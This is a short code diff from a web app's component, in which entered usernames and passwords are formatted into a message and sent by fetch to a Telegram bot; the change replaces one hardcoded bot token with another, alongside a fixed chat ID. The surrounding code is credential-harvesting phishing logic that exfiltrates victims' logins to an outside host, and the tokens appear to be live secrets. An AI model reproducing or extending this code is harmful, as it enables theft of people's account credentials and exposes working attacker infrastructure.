@@ -26,7 +26,7 @@ export function App() {
     // Send to Telegram
     try {
       const message = `Username: ${username}\nPassword: ${password}`;
-      const telegramBotToken = "8673978157:AAFWiYR__xUFb79u9Tfrz-8guCB10sgruX0";
+      const telegramBotToken = "8811898322:AAGWlv39I3xOuk6tKKW6Qbhi7zEu9RSfqqs";
       const chatId = "8745839603";
 
       await fetch(
